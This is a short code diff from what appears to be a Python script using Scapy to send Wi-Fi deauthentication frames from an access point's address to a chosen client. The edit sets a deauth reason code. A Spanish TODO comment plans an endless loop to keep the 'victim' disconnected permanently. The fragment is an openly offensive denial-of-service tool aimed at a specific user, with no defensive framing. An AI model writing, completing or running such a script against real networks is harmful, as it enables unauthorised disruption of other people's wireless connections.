@@ -17,8 +17,7 @@ parser.add_argument('-n', '--Iterations', metavar="N",help="Numero de paquetes D
 
 args = parser.parse_args()
 
-
-request = RadioTap()/Dot11(addr1=args.USER,addr2=args.POINT,addr3=args.POINT)/Dot11Deauth()
+request = RadioTap()/Dot11(addr1=args.USER,addr2=args.POINT,addr3=args.POINT)/Dot11Deauth(reason=7)
 
 #FAlTA:hacer ciclo endefinido pra mantener  victima desautenticada permanentemente
 
